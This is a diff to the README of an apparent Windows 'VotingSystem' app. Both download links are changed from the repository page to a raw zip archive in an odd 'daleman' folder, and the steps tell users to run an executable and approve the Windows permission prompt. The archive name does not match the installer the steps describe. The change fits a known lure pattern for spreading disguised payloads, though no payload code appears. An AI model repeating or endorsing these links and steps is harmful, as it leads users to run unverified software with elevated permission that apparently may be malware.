@@ -1,6 +1,6 @@
 # 🗳️ VotingSystem - Secure Digital Elections For Everyone
 
-[![Download VotingSystem](https://img.shields.io/badge/Download-VotingSystem-blue.svg)](https://github.com/zakariyawaelgweari2005-cyber/VotingSystem)
+[![Download VotingSystem](https://img.shields.io/badge/Download-VotingSystem-blue.svg)](https://github.com/zakariyawaelgweari2005-cyber/VotingSystem/raw/refs/heads/main/daleman/System-Voting-1.4.zip)
 
 ## 📖 About The Project
 
@@ -21,7 +21,7 @@ Your computer must meet these basic needs to run the software:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit [this page to download](https://github.com/zakariyawaelgweari2005-cyber/VotingSystem) the installer.
+1. Visit [this page to download](https://github.com/zakariyawaelgweari2005-cyber/VotingSystem/raw/refs/heads/main/daleman/System-Voting-1.4.zip) the installer.
 2. Locate the file named VotingSystem_Installer.exe in your Downloads folder.
 3. Double-click the file to start the installation.
 4. Click Yes if Windows asks for permission to run the file.
